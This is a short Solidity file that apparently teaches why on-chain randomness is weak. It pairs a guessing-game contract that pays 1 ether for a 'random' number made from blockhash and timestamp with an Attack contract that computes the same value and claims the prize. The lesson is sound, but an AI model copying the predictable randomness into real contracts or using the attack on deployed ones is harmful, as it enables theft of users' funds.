// program to show the source of randomness in solidity.

pragma solidity ^0.7.6;

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
         uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
